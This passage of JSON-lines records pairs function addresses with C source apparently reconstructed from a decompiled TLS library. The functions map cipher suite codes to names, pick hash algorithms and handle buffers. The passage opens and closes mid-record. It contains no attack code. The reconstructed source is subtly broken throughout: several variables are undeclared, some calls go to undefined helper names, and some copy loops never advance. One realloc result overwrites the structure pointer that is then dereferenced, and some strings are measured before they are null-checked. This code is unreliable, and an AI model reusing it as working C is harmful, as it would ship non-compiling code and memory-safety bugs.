param_1; \n    } else {\n        \n        if ((integerValue == 0) || (anotherMemoryPointer == (void *)0x0)) goto LAB_00429e66; \n        tempAddress1 = param_1; \n        tempAddress2 = param_1 + 0x20; \n    }\n    \n    FUN_00426a30(param_1, allocatedMemoryPointer, param_2, anotherMemoryPointer, integerValue, 0xd, tempAddress1, 0x20, tempAddress2, 0x20);\nLAB_00429e66:\n    \n    if (anotherMemoryPointer != (void *)0x0) {\n        free(anotherMemoryPointer); \n    }\n    *(undefined8 *)(param_1 + 200) = 0; \n    *(undefined4 *)(param_1 + 0xd0) = 0; \n    FUN_00429a60(param_1); \n    return 1; \n}"}
{"Function Name": "FUN_0042a0a0", "Address": "0042a0a0", "Source Code": "uint FUN_0042a0a0(uint input_value)\n{\n    uint result_value = 0; \n    FUN_004283b0(&result_value, 4); \n    if (input_value != 0) { \n        result_value %= input_value; \n    }\n    return result_value; \n}"}
{"Function Name": "FUN_0042a140", "Address": "0042a140", "Source Code": "void checkAndExecute(long address)\n{\n    \n    if (*(long *)(address + 0x22360) == 0) {\n        \n        executeFunction();\n    }\n}"}
{"Function Name": "FUN_0042a160", "Address": "0042a160", "Source Code": "void FUN_0042a160(long inputPointer)\n{\n    \n    if (inputPointer != 0 && *(void **)(inputPointer + 0x22360) != (void *)0x0) {\n        \n        releaseMemory(*(void **)(inputPointer + 0x22360));\n        \n        *(undefined8 *)(inputPointer + 0x22360) = 0;\n    }\n}"}
{"Function Name": "FUN_0042a190", "Address": "0042a190", "Source Code": "void FUN_0042a190(long input_param)\n{\n    long retrieved_value; \n    undefined temp_storage[56]; \n    \n    if (input_param != 0) { \n        retrieved_value = *(long *)(input_param + 0x22360); \n        if (retrieved_value == 0) { \n            retrieved_value = FUN_00405c20(); \n        }\n        \n        \n        if ((1 < (ushort)(*(short *)(input_param + 100) - 0x303U)) &&\n            (1 < (ushort)(*(short *)(input_param + 100) + 0x104U))) {\n            if (*(char *)(retrieved_value + 0x330) != '\\0') { \n                FUN_00413ef0(retrieved_value, temp_storage); \n                FUN_004125e0(retrieved_value + 0x220, temp_storage); \n            }\n            FUN_00413d60(retrieved_value); \n            FUN_00412450(retrieved_value + 0x220); \n            *(undefined *)(retrieved_value + 0x330) = 1; \n            return; \n        }\n        \n        if (*(char *)(retrieved_value + 0x330) != '\\0') { \n            FUN_00412f30(retrieved_value, temp_storage); \n            FUN_00412930(retrieved_value + 0x110, temp_storage); \n        }\n        FUN_00412ae0(retrieved_value + 0x110); \n        FUN_00412790(retrieved_value); \n        *(undefined *)(retrieved_value + 0x330) = 1; \n    }\n}"}
{"Function Name": "FUN_0042a460", "Address": "0042a460", "Source Code": "undefined4 FUN_0042a460(long input_param)\n{\n    int int_value; \n    undefined4 return_value; \n    long long_value; \n    \n    if (input_param != 0) {\n        \n        long_value = *(long *)(input_param + 0x22360);\n        \n        \n        if ((long_value == 0) && (long_value = FUN_00405c20(), long_value == 0)) {\n            return 0; \n        }\n        \n        \n        if ((*(char *)(long_value + 0x330) != '\\0') && (long_value = *(long *)(input_param + 0x223e0), long_value != 0) &&\n            (int_value = *(int *)(input_param + 0x223e8), int_value != 0)) {\n            \n            \n            if (*(void **)(input_param + 0x22360) != (void *)0x0) {\n                free(*(void **)(input_param + 0x22360));\n            }\n            *(undefined8 *)(input_param + 0x22360) = 0; \n            \n            \n            return_value = FUN_0042a290(input_param, long_value, int_value);\n            \n            \n            if (*(void **)(input_param + 0x223e0) != (void *)0x0) {\n                free(*(void **)(input_param + 0x223e0));\n            }\n            *(undefined8 *)(input_param + 0x223e0) = 0; \n            *(undefined4 *)(input_param + 0x223e8) = 0; \n            \n            return return_value; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042a530", "Address": "0042a530", "Source Code": "undefined8 FUN_0042a530(long inputPointer, undefined *outputBuffer)\n{\n    long memoryValue; \n    undefined8 returnValue; \n    undefined tempStorage[56]; \n    if (inputPointer != 0) { \n        memoryValue = *(long *)(inputPointer + 0x22360); \n        if (memoryValue == 0) { \n            memoryValue = FUN_00405c20(); \n        }\n        if (*(char *)(memoryValue + 0x330) != '\\0') { \n            if (((ushort)(*(short *)(inputPointer + 100) - 0x303U) < 2) || \n                ((ushort)(*(short *)(inputPointer + 100) + 0x104U) < 2)) { \n                if (outputBuffer == (undefined *)0x0) { \n                    outputBuffer = tempStorage; \n                }\n                if (FUN_00426920(inputPointer) == 0x30) { \n                    FUN_00412930(memoryValue, tempStorage); \n                    returnValue = 0x30; \n                    FUN_00412f30(memoryValue + 0x110, outputBuffer); \n                } else {\n                    returnValue = 0x20; \n                    FUN_00412930(memoryValue, outputBuffer); \n                    FUN_00412f30(memoryValue + 0x110, tempStorage); \n                }\n            } else {\n                if (outputBuffer == (undefined *)0x0) { \n                    outputBuffer = tempStorage; \n                }\n                FUN_00413ef0(memoryValue, outputBuffer); \n                returnValue = 0x24; \n                FUN_004125e0(memoryValue + 0x220, outputBuffer + 0x10); \n            }\n            *(undefined *)(memoryValue + 0x330) = 0; \n            if (*(void **)(inputPointer + 0x223e0) != (void *)0x0) { \n                free(*(void **)(inputPointer + 0x223e0)); \n                *(undefined8 *)(inputPointer + 0x223e0) = 0; \n                *(undefined4 *)(inputPointer + 0x223e8) = 0; \n            }\n            return returnValue; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042a6a0", "Address": "0042a6a0", "Source Code": "undefined8 FUN_0042a6a0(long input_parameter) \n{\n    if (input_parameter == 0) { \n        return 0xffffffff; \n    }\n    \n    int function_result = FUN_00426920(); \n    \n    if (function_result == 0x20) { \n        return FUN_00414210(\"sha256\"); \n    }\n    if (function_result == 0x30) { \n        return FUN_00414210(\"sha384\"); \n    }\n    if (function_result == 0x14) { \n        return FUN_00414210(&DAT_00437669); \n    }\n    \n    return 0xffffffff; \n}"}
{"Function Name": "FUN_0042a710", "Address": "0042a710", "Source Code": "undefined8 FUN_0042a710(long inputPointer,long outputPointer)\n{\n    undefined2 twoByteValue; \n    undefined4 fourByteValue; \n    long loopCounter; \n    ulong unsignedLongValue1; \n    ulong unsignedLongValue2; \n    undefined8 *dataPointer; \n    undefined8 *unusedPointer1; \n    undefined8 *unusedPointer2; \n    bool isPointerOdd; \n    byte byteValue = 0; \n    undefined localData; \n    undefined8 stackArray[34]; \n    if (inputPointer != 0) { \n        dataPointer = *(undefined8 **)(inputPointer + 0x22360); \n        if (dataPointer == (undefined8 *)0x0) { \n            dataPointer = (undefined8 *)FUN_00405c20(); \n        }\n        if (*(char *)(dataPointer + 0x66) != '\\0') { \n            if ((1 < (ushort)(*(short *)(inputPointer + 100) - 0x303U)) && \n                (1 < (ushort)(*(short *)(inputPointer + 100) + 0x104U))) {\n                for (loopCounter = 0x22; loopCounter != 0; loopCounter--) { \n                    *(undefined8 *)&localData = *dataPointer; \n                    dataPointer++; \n                }\n                FUN_00413ef0(dataPointer, outputPointer); \n                isPointerOdd = ((ulong)dataPointer & 1) != 0; \n                unsignedLongValue2 = 0x110; \n                if (isPointerOdd) { \n                    dataPointer = (undefined8 *)((long)dataPointer + 1); \n                    *(undefined *)dataPointer = localData; \n                    unsignedLongValue2 = 0x10f; \n                }\n                if (((ulong)dataPointer & 2) != 0) { \n                    twoByteValue = *(undefined2 *)&stackArray; \n                    *(undefined2 *)dataPointer = twoByteValue; \n                }\n                if (((ulong)dataPointer & 4) != 0) { \n                    fourByteValue = *(undefined4 *)&stackArray; \n                    *(undefined4 *)dataPointer = fourByteValue; \n                }\n                for (unsignedLongValue1 = unsignedLongValue2 >> 3; unsignedLongValue1 != 0; unsignedLongValue1--) { \n                    *dataPointer = *(undefined8 *)&stackArray; \n                }\n                loopCounter = 0; \n                if ((unsignedLongValue2 & 4) != 0) { \n                    *(undefined4 *)dataPointer = *(undefined4 *)&stackArray; \n                    loopCounter = 4; \n                }\n                if ((unsignedLongValue2 & 2) != 0) { \n                    *(undefined2 *)((long)dataPointer + loopCounter) = *(undefined2 *)((long)&stackArray + loopCounter); \n                    loopCounter += 2; \n                }\n                if (isPointerOdd) { \n                    *(undefined *)((long)dataPointer + loopCounter) = *(undefined *)((long)&stackArray + loopCounter); \n                }\n                dataPointer = dataPointer + 0x44; \n                for (loopCounter = 0x22; loopCounter != 0; loopCounter--) { \n                    *(undefined8 *)&localData = *dataPointer; \n                    dataPointer++; \n                }\n                FUN_004125e0(dataPointer, outputPointer + 0x10); \n                isPointerOdd = ((ulong)dataPointer & 1) != 0; \n                unsignedLongValue2 = 0x110; \n                if (isPointerOdd) { \n                    dataPointer = (undefined8 *)((long)dataPointer + 0x221); \n                    *(undefined *)dataPointer = localData; \n                    unsignedLongValue2 = 0x10f; \n                }\n                if (((ulong)dataPointer & 2) != 0) { \n                    twoByteValue = *(undefined2 *)&stackArray; \n                    *(undefined2 *)dataPointer = twoByteValue; \n                }\n                if (((ulong)dataPointer & 4) != 0) { \n                    fourByteValue = *(undefined4 *)&stackArray; \n                    *(undefined4 *)dataPointer = fourByteValue; \n                }\n                for (unsignedLongValue1 = unsignedLongValue2 >> 3; unsignedLongValue1 != 0; unsignedLongValue1--) { \n                    *dataPointer = *(undefined8 *)&stackArray; \n                }\n                loopCounter = 0; \n                if ((unsignedLongValue2 & 4) != 0) { \n                    *(undefined4 *)dataPointer = *(undefined4 *)&stackArray; \n                    loopCounter = 4; \n                }\n                if ((unsignedLongValue2 & 2) != 0) { \n                    *(undefined2 *)((long)dataPointer + loopCounter) = *(undefined2 *)((long)&stackArray + loopCounter); \n                    loopCounter += 2; \n                }\n                if (isPointerOdd) { \n                    *(undefined *)((long)dataPointer + loopCounter) = *(undefined *)((long)&stackArray + loopCounter); \n                }\n                return 0x24; \n            }\n            functionReturnValue = FUN_00426920(inputPointer); \n            if (functionReturnValue == 0x30) { \n                dataPointer = dataPointer + 0x22; \n                for (loopCounter = 0x22; loopCounter != 0; loopCounter--) { \n                    *(undefined8 *)&localData = *dataPointer; \n                    dataPointer++; \n                }\n                FUN_00412f30(dataPointer, outputPointer); \n                isPointerOdd = ((ulong)dataPointer & 1) != 0; \n                unsignedLongValue2 = 0x110; \n                if (isPointerOdd) { \n                    dataPointer = (undefined8 *)((long)dataPointer + 0x111); \n                    *(undefined *)dataPointer = localData; \n                    unsignedLongValue2 = 0x10f; \n                }\n                if (((ulong)dataPointer & 2) != 0) { \n                    twoByteValue = *(undefined2 *)&stackArray; \n                    *(undefined2 *)dataPointer = twoByteValue; \n                }\n                if (((ulong)dataPointer & 4) != 0) { \n                    fourByteValue = *(undefined4 *)&stackArray; \n                    *(undefined4 *)dataPointer = fourByteValue; \n                }\n                for (unsignedLongValue1 = unsignedLongValue2 >> 3; unsignedLongValue1 != 0; unsignedLongValue1--) { \n                    *dataPointer = *(undefined8 *)&stackArray; \n                }\n                loopCounter = 0; \n                if ((unsignedLongValue2 & 4) != 0) { \n                    *(undefined4 *)dataPointer = *(undefined4 *)&stackArray; \n                    loopCounter = 4; \n                }\n                if ((unsignedLongValue2 & 2) != 0) { \n                    *(undefined2 *)((long)dataPointer + loopCounter) = *(undefined2 *)((long)&stackArray + loopCounter); \n                    loopCounter += 2; \n                }\n                if (isPointerOdd) { \n                    *(undefined *)((long)dataPointer + loopCounter) = *(undefined *)((long)&stackArray + loopCounter); \n                }\n                return 0x30; \n            }\n            for (loopCounter = 0x22; loopCounter != 0; loopCounter--) { \n                *(undefined8 *)&localData = *dataPointer; \n                dataPointer++; \n            }\n            FUN_00412930(dataPointer, outputPointer); \n            isPointerOdd = ((ulong)dataPointer & 1) != 0; \n            anotherUnsignedLongValue = 0x110; \n            if (isPointerOdd) { \n                dataPointer = (undefined8 *)((long)dataPointer + 1); \n                *(undefined *)dataPointer = localData; \n                anotherUnsignedLongValue = 0x10f; \n            }\n            if (((ulong)dataPointer & 2) != 0) { \n                twoByteValue = *(undefined2 *)&stackArray; \n                *(undefined2 *)dataPointer = twoByteValue; \n            }\n            if (((ulong)dataPointer & 4) != 0) { \n                fourByteValue = *(undefined4 *)&stackArray; \n                *(undefined4 *)dataPointer = fourByteValue; \n            }\n            loopCounter = 0; \n            for (unsignedLongValue2 = (ulong)(anotherUnsignedLongValue >> 3); unsignedLongValue2 != 0; unsignedLongValue2--) { \n                *dataPointer = *(undefined8 *)&stackArray; \n            }\n            if ((anotherUnsignedLongValue & 4) != 0) { \n                *(undefined4 *)dataPointer = *(undefined4 *)&stackArray; \n                loopCounter = 4; \n            }\n            if ((anotherUnsignedLongValue & 2) != 0) { \n                *(undefined2 *)((long)dataPointer + loopCounter) = *(undefined2 *)((long)&stackArray + loopCounter); \n                loopCounter += 2; \n            }\n            if (isPointerOdd) { \n                *(undefined *)((long)dataPointer + loopCounter) = *(undefined *)((long)&stackArray + loopCounter); \n            }\n            return 0x20; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042ab40", "Address": "0042ab40", "Source Code": "undefined4 FUN_0042ab40(void **inputParams)\n{\n    void *pointerToValue; \n    undefined4 returnValue; \n    int totalSize; \n    \n    if ((inputParams == (void **)0x0) || (pointerToValue = inputParams[3], pointerToValue == (void *)0x0)) {\n        returnValue = 0xffffffff; \n    }\n    else {\n        \n        if (*(void **)((long)pointerToValue + 0x22390) == (void *)0x0) {\n            \n            *(undefined4 *)((long)pointerToValue + 0x22398) = *(undefined4 *)(inputParams + 1);\n            \n            *(void **)((long)pointerToValue + 0x22390) = *inputParams;\n            *inputParams = (void *)0x0; \n            *(undefined4 *)(inputParams + 1) = 0; \n            *(undefined4 *)((long)inputParams + 0xc) = 0; \n            FUN_00428100(inputParams); \n            return *(undefined4 *)((long)pointerToValue + 0x22398); \n        }\n        \n        totalSize = *(int *)(inputParams + 1) + *(int *)((long)pointerToValue + 0x22398);\n        \n        pointerToValue = realloc(*(void **)((long)pointerToValue + 0x22390), (long)totalSize);\n        *(void **)((long)pointerToValue + 0x22390) = pointerToValue; \n        \n        if (pointerToValue == (void *)0x0) {\n            *(undefined4 *)((long)pointerToValue + 0x22398) = 0; \n            returnValue = 0xffffffff; \n        }\n        else {\n            \n            memcpy((void *)((ulong)*(uint *)((long)pointerToValue + 0x22398) + (long)pointerToValue), *inputParams, (ulong)*(uint *)(inputParams + 1));\n            *(int *)((long)pointerToValue + 0x22398) = totalSize; \n            returnValue = *(undefined4 *)(inputParams + 1); \n            FUN_00428100(inputParams); \n        }\n    }\n    return returnValue; \n}"}
{"Function Name": "FUN_0042ac20", "Address": "0042ac20", "Source Code": "uint FUN_0042ac20(long memoryAddress, void *sourceData, uint dataSize)\n{\n    \n    if (memoryAddress == 0) {\n        return 0xffffffff;\n    }\n    \n    \n    if (sourceData == (void *)0x0 || dataSize == 0) {\n        return 0;\n    }\n    \n    \n    int allocatedSize = *(int *)(memoryAddress + 0x223a8) + dataSize;\n    \n    \n    void *reallocatedMemory = realloc(*(void **)(memoryAddress + 0x223a0), (long)allocatedSize);\n    \n    \n    *(void **)(memoryAddress + 0x223a0) = reallocatedMemory;\n    \n    \n    if (reallocatedMemory != (void *)0x0) {\n        \n        memcpy((void *)((ulong)*(uint *)(memoryAddress + 0x223a8) + (long)reallocatedMemory), sourceData, (ulong)dataSize);\n        \n        \n        *(int *)(memoryAddress + 0x223a8) = allocatedSize;\n        \n        \n        return dataSize;\n    }\n    \n    \n    *(int *)(memoryAddress + 0x223a8) = 0;\n    return 0xffffffff;\n}"}
{"Function Name": "FUN_0042ae30", "Address": "0042ae30", "Source Code": "void FUN_0042ae30(long input_address)\n{\n    \n    void **pointer_to_void = (void **)(input_address + 0x22390);\n    \n    \n    if (input_address != 0 && *pointer_to_void != (void *)0x0) {\n        \n        free(*pointer_to_void);\n        \n        \n        *pointer_to_void = 0;\n        \n        \n        *(undefined4 *)(input_address + 0x22398) = 0;\n    }\n    \n    \n    return;\n}"}
{"Function Name": "FUN_0042ae70", "Address": "0042ae70", "Source Code": "ulong FUN_0042ae70(long input_value) \n{\n    if (input_value == 0) { \n        return 0; \n    }\n    if (*(char *)(input_value + 0x22389) == '\\0') { \n        return (ulong)(*(char *)(input_value + 0x22388) == -1); \n    }\n    return 0xffffffff; \n}"}
{"Function Name": "FUN_0042aea0", "Address": "0042aea0", "Source Code": "void FUN_0042aea0(long input_address)\n{\n    \n    void **pointer_to_pointer = (void **)(input_address + 0x223a0);\n    \n    \n    if (input_address != 0 && *pointer_to_pointer != (void *)0x0) {\n        \n        free(*pointer_to_pointer);\n        \n        \n        *pointer_to_pointer = 0;\n        \n        \n        *(undefined4 *)(input_address + 0x223a8) = 0;\n    }\n}"}
{"Function Name": "FUN_0042aee0", "Address": "0042aee0", "Source Code": "uint FUN_0042aee0(long source_pointer, void *destination_buffer, uint max_bytes)\n{\n    uint data_size; \n    uint bytes_copied = 0xffffffff; \n    \n    if (source_pointer != 0 && *(void **)(source_pointer + 0x223a0) != (void *)0x0) {\n        data_size = *(uint *)(source_pointer + 0x223a8); \n        if (data_size != 0) { \n            \n            bytes_copied = (max_bytes <= data_size) ? max_bytes : data_size;\n            \n            memcpy(destination_buffer, *(void **)(source_pointer + 0x223a0), (ulong)bytes_copied);\n            \n            if (data_size == bytes_copied) {\n                \n                free(*(void **)(source_pointer + 0x223a0));\n                \n                *(void **)(source_pointer + 0x223a0) = (void *)0x0;\n                \n                *(uint *)(source_pointer + 0x223a8) = 0;\n                return data_size; \n            }\n            \n            *(uint *)(source_pointer + 0x223a8) = data_size - bytes_copied;\n            \n            memmove(*(void **)(source_pointer + 0x223a0),\n                    (void *)((long)*(void **)(source_pointer + 0x223a0) + (ulong)bytes_copied),\n                    (ulong)(data_size - bytes_copied));\n        }\n    }\n    return bytes_copied; \n}"}
{"Function Name": "FUN_0042b010", "Address": "0042b010", "Source Code": "undefined8 FUN_0042b010(long input_pointer, undefined8 new_value)\n{\n    \n    if (*(char *)(input_pointer + 0x66) != '\\0') {\n        \n        undefined8 old_value = *(undefined8 *)(input_pointer + 0xa0);\n        \n        *(undefined8 *)(input_pointer + 0xa0) = new_value;\n        \n        return old_value;\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_0042b030", "Address": "0042b030", "Source Code": "void * FUN_0042b030(long input_param)\n{\n    void *allocated_memory = (void *)0x0; \n    if ((input_param != 0) && (*(char *)(input_param + 0x66) != '\\0')) { \n        allocated_memory = malloc(0x22430); \n        if (allocated_memory != (void *)0x0) { \n            memset(allocated_memory, 0, 0x22430); \n            *(undefined *)((long)allocated_memory + 0x66) = 1; \n            *(undefined *)((long)allocated_memory + 0x223ac) = 1; \n            *(undefined *)((long)allocated_memory + 0x223c9) = *(undefined *)(input_param + 0x223c9); \n            *(undefined2 *)((long)allocated_memory + 100) = *(undefined2 *)(input_param + 100); \n            *(undefined8 *)((long)allocated_memory + 0x68) = *(undefined8 *)(input_param + 0x68); \n            *(undefined4 *)((long)allocated_memory + 0xb0) = *(undefined4 *)(input_param + 0xb0); \n            *(undefined8 *)((long)allocated_memory + 0x70) = *(undefined8 *)(input_param + 0x70); \n            *(undefined8 *)((long)allocated_memory + 0x78) = *(undefined8 *)(input_param + 0x78); \n            *(undefined *)((long)allocated_memory + 0x223ad) = *(undefined *)(input_param + 0x223ad); \n            *(undefined8 *)((long)allocated_memory + 0x22400) = *(undefined8 *)(input_param + 0x22400); \n            *(undefined4 *)((long)allocated_memory + 0x22408) = *(undefined4 *)(input_param + 0x22408); \n            *(undefined8 *)((long)allocated_memory + 0x90) = *(undefined8 *)(input_param + 0x90); \n            *(undefined8 *)((long)allocated_memory + 0x98) = *(undefined8 *)(input_param + 0x98); \n            *(undefined8 *)((long)allocated_memory + 0xa0) = *(undefined8 *)(input_param + 0xa0); \n            *(undefined8 *)((long)allocated_memory + 0x22410) = *(undefined8 *)(input_param + 0x22410); \n            *(undefined *)((long)allocated_memory + 0x22418) = *(undefined *)(input_param + 0x22418); \n        }\n    }\n    return allocated_memory; \n}"}
{"Function Name": "FUN_0042b130", "Address": "0042b130", "Source Code": "void FUN_0042b130(long input_pointer)\n{\n    \n    if (*(long *)(input_pointer + 0x88) != 0) {\n        \n        cleanup_function();\n        \n        \n        memory_free(*(void **)(input_pointer + 0x88));\n        \n        \n        *(undefined8 *)(input_pointer + 0x88) = 0;\n    }\n    \n    return;\n}"}
{"Function Name": "FUN_0042b170", "Address": "0042b170", "Source Code": "void * FUN_0042b170(long inputPointer, undefined8 inputData, uint inputSize, undefined4 *outputParameter, int additionalParam)\n{\n    int returnValue; \n    void *allocatedMemory; \n    long sizeOrValue; \n    undefined8 *localArrayPtr; \n    undefined4 *dataStructurePtr; \n    ulong memorySize; \n    undefined8 intermediateValues[7]; \n    *outputParameter = 0; \n    \n    if (inputSize != 0 && inputPointer != 0 && *(long *)(inputPointer + 0x88) != 0) {\n        dataStructurePtr = *(undefined4 **)(inputPointer + 0xa0); \n        memorySize = (ulong)inputSize; \n        localArrayPtr = intermediateValues; \n        \n        if (dataStructurePtr == (undefined4 *)0x0) {\n            dataStructurePtr = &DAT_00649380; \n        }\n        \n        for (sizeOrValue = 6; sizeOrValue != 0; sizeOrValue--) {\n            *localArrayPtr++ = 0; \n        }\n        \n        returnValue = FUN_0041b070(inputData, memorySize, intermediateValues, dataStructurePtr + 0x10);\n        if (returnValue == 0) { \n            allocatedMemory = malloc(memorySize); \n            sizeOrValue = memorySize; \n            \n            returnValue = FUN_004207a0(*(undefined8 *)(inputPointer + 0x88), intermediateValues, allocatedMemory, &sizeOrValue);\n            FUN_0041b230(intermediateValues); \n            if (additionalParam != 0) { \n                FUN_0042b130(inputPointer); \n            }\n            if (returnValue == 0) { \n                *outputParameter = (int)sizeOrValue; \n                return allocatedMemory; \n            }\n            if (allocatedMemory != (void *)0x0) { \n                free(allocatedMemory); \n            }\n        }\n    }\n    return (void *)0x0; \n}"}
{"Function Name": "FUN_0042b280", "Address": "0042b280", "Source Code": "void FUN_0042b280(long param_1)\n{\n    undefined8 *allocatedMemoryPointer; \n    long loopCounter; \n    allocatedMemoryPointer = (undefined8 *)malloc(0x30); \n    *(undefined8 **)(param_1 + 0x88) = allocatedMemoryPointer; \n    for (loopCounter = 0; loopCounter < 6; loopCounter++) { \n        *allocatedMemoryPointer++ = 0; \n    }\n    return; \n}"}
{"Function Name": "FUN_0042b2b0", "Address": "0042b2b0", "Source Code": "undefined8 FUN_0042b2b0(long input_param, char *source_str, char *target_str)\n{\n    \n    size_t source_length = strlen(source_str);\n    \n    size_t target_length = strlen(target_str);\n    void *allocated_memory;\n    \n    if (input_param != 0 && *(char *)(input_param + 0x223ac) == '\\0' && \n        *(char *)(input_param + 0x66) != '\\0' && source_str != (char *)0x0 && \n        target_str != (char *)0x0) \n    {\n        \n        if (*(void **)(input_param + 0x90) != (void *)0x0) {\n            free(*(void **)(input_param + 0x90));\n        }\n        \n        if (*(void **)(input_param + 0x98) != (void *)0x0) {\n            free(*(void **)(input_param + 0x98));\n        }\n        \n        *(undefined8 *)(input_param + 0x90) = 0;\n        *(undefined8 *)(input_param + 0x98) = 0;\n        \n        if (target_length != 0 && source_length != 0) {\n            \n            allocated_memory = malloc(source_length + 1);\n            *(void **)(input_param + 0x90) = allocated_memory;\n            \n            if (allocated_memory != (void *)0x0) {\n                \n                void *allocated_target_memory = malloc(target_length + 1);\n                *(void **)(input_param + 0x98) = allocated_target_memory;\n                \n                if (allocated_target_memory != (void *)0x0) {\n                    \n                    memcpy(allocated_memory, source_str, source_length);\n                    \n                    *(undefined *)(*(long *)(input_param + 0x90) + source_length) = 0;\n                    \n                    memcpy(*(void **)(input_param + 0x98), target_str, target_length);\n                    \n                    *(undefined *)(*(long *)(input_param + 0x98) + target_length) = 0;\n                    return 1; \n                }\n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042b3d0", "Address": "0042b3d0", "Source Code": "undefined8 FUN_0042b3d0(long input_value)\n{\n    \n    return input_value != 0 ? \n        \n        *(undefined8 *)(input_value + 0x22420) : \n        \n        0;\n}"}
{"Function Name": "FUN_0042b5c0", "Address": "0042b5c0", "Source Code": "bool FUN_0042b5c0(long input_address, ushort input_value)\n{\n    \n    if (input_address == 0) {\n        return false; \n    }\n    \n    \n    if (input_value < 0xc00b) {\n        \n        if (input_value < 0xc009) {\n            \n            if (input_value < 0x3e) {\n                \n                if (input_value < 0x3c) {\n                    \n                    if (input_value != 0x33) {\n                        \n                        if (input_value < 0x34) {\n                            return input_value == 0x2f; \n                        }\n                        \n                        return input_value == 0x35 || input_value == 0x39;\n                    }\n                    return true; \n                }\n            } else if (input_value != 0x6b) {\n                \n                if (input_value < 0x6c) {\n                    return input_value == 0x67; \n                }\n                \n                return 3 > (ushort)(input_value - 0x9c);\n            }\n        }\n        \n        return *(long *)(input_address + 0x68) != 0;\n    } else {\n        \n        if (input_value < 0xc02d) {\n            \n            if (input_value < 0xc02b) {\n                \n                if (0xc024 < input_value) {\n                    return input_value == 0xc027; \n                }\n                \n                return 1 > (ushort)(input_value + 0x3fed);\n            }\n        } else {\n            \n            if (input_value == 0xcca8) {\n                \n                return *(short *)(input_address + 100) == -0x103 || *(short *)(input_address + 100) == 0x303;\n            }\n            \n            if (input_value < 0xcca9) {\n                return 1 > (ushort)(input_value + 0x3fd1); \n            }\n            \n            if (input_value != 0xccaa) {\n                return input_value == 0xcca9; \n            }\n        }\n        \n        if (*(short *)(input_address + 100) != -0x103 && *(short *)(input_address + 100) != 0x303) {\n            return false; \n        }\n        \n        if (*(long *)(input_address + 0x68) == 0) {\n            return false; \n        }\n    }\n    \n    return *(int *)(input_address + 0xb0) != 0 && *(long *)(input_address + 0x78) != 0;\n}"}
{"Function Name": "FUN_0042b990", "Address": "0042b990", "Source Code": "undefined8 FUN_0042b990(long input_param)\n{\n    ushort ushort_value; \n    if (input_param == 0) { \n        return 0; \n    }\n    ushort_value = *(ushort *)(input_param + 0x62); \n    if (ushort_value < 0xc015) { \n        if (0xc012 < ushort_value) { \n            return 2; \n        }\n        if (ushort_value == 0x6b || ushort_value == 0x39 || ushort_value == 0x33 || ushort_value == 0x67) { \n            return 1; \n        }\n        return 0; \n    } else { \n        if (ushort_value < 0xc02d) { \n            if (0xc02a < ushort_value) { \n                return 2; \n            }\n            if (ushort_value < 0xc023 || (ushort_value < 0xc025 && ushort_value != 0xc027)) { \n                return 0; \n            }\n            return 2; \n        }\n        if (0xcca9 < ushort_value) { \n            return (ushort_value == 0xccaa) ? 1 : 0; \n        }\n        return (0xcca7 < ushort_value) ? 2 : 0; \n    }\n}"}
{"Function Name": "FUN_0042ba60", "Address": "0042ba60", "Source Code": "char * FUN_0042ba60(long input_param)\n{\n    ushort value_from_memory; \n    if (input_param != 0) { \n        value_from_memory = *(ushort *)(input_param + 0x62); \n        if (value_from_memory == 0x1304) { \n            return \"TLS-AES-128-CCM-SHA256\"; \n        }\n        \n        if (value_from_memory < 0x1305) { \n            if (value_from_memory == 0x6b) { \n                return \"DHE-RSA-AES256CBC-SHA256\"; \n            }\n            if (value_from_memory < 0x6c) { \n                if (value_from_memory == 0x39) { \n                    return \"DHE-RSA-AES256CBC-SHA\"; \n                }\n                if (value_from_memory < 0x3a) { \n                    if (value_from_memory == 0x33) { \n                        return \"DHE-RSA-AES128CBC-SHA\"; \n                    }\n                    if (value_from_memory == 0x35) { \n                        return \"RSA-AES256CBC-SHA\"; \n                    }\n                    if (value_from_memory == 0x2f) { \n                        return \"RSA-AES128CBC-SHA\"; \n                    }\n                }\n            } else { \n                if (value_from_memory == 0x3d) { \n                    return \"RSA-AES256CBC-SHA256\"; \n                }\n                if (value_from_memory == 0x67) { \n                    return \"DHE-RSA-AES128CBC-SHA256\"; \n                }\n                if (value_from_memory == 0x3c) { \n                    return \"RSA-AES128CBC-SHA256\"; \n                }\n            }\n        } else { \n            if (value_from_memory == 0x9f) { \n                return \"DHE-RSA-AES256GCM-SHA384\"; \n            }\n            if (value_from_memory < 0xa0) { \n                if (value_from_memory == 0x9d) { \n                    return \"RSA-AES256GCM-SHA384\"; \n                }\n                if (value_from_memory < 0x9e) { \n                    return \"DHE-RSA-AES128GCM-SHA256\"; \n                }\n                if (value_from_memory == 0x9c) { \n                    return \"RSA-AES128GCM-SHA256\"; \n                }\n            } else { \n                if (value_from_memory == 0x1302) { \n                    return \"TLS-AES-256-GCM-SHA384\"; \n                }\n                if (value_from_memory < 0x1303) { \n                    return \"TLS-CHACHA20-POLY1305-SHA256\"; \n                }\n                if (value_from_memory == 0x1301) { \n                    return \"TLS-AES-128-GCM-SHA256\"; \n                }\n            }\n        }\n    }\n    if (value_from_memory == 0xc027) { \n        return \"ECDHE-RSA-AES128CBC-SHA256\"; \n    }\n    \n    if (value_from_memory < 0xc028) { \n        if (value_from_memory == 0xc013) { \n            return \"ECDHE-RSA-AES128CBC-SHA\"; \n        }\n        if (value_from_memory < 0xc014) { \n            if (value_from_memory == 0xc009) { \n                return \"ECDHE-ECDSA-AES128CBC-SHA\"; \n            }\n            if (value_from_memory == 0xc00a) { \n                return \"ECDHE-ECDSA-AES256CBC-SHA\"; \n            }\n            if (value_from_memory == 0x1305) { \n                return \"TLS-AES-128-CCM-8-SHA256\"; \n            }\n        } else { \n            if (value_from_memory == 0xc023) { \n                return \"ECDHE-ECDSA-AES128CBC-SHA256\"; \n            }\n            if (value_from_memory == 0xc024) { \n                return \"ECDHE-ECDSA-AES256CBC-SHA384\"; \n            }\n            if (value_from_memory == 0xc014) { \n                return \"ECDHE-RSA-AES256CBC-SHA\"; \n            }\n        }\n    } else { \n        if (value_from_memory == 0xc030) { \n            return \"ECDHE-RSA-AES256GCM-SHA384\"; \n        }\n        if (value_from_memory < 0xc031) { \n            if (value_from_memory == 0xc02c) { \n                return \"ECDHE-ECDSA-AES256GCM-SHA384\"; \n            }\n            if (value_from_memory == 0xc02f) { \n                return 